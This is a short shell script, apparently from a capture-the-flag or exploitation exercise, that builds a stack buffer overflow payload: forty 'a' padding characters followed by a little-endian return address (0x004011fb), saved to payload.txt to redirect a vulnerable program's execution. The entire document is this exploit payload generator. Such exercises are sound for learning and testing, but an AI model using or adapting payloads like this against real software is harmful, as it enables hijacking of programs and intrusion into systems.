a="aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
address=$(printf '\xfb\x11\x40\x00' | xxd -p)
payload=$a$address
echo $payload > payload.txt
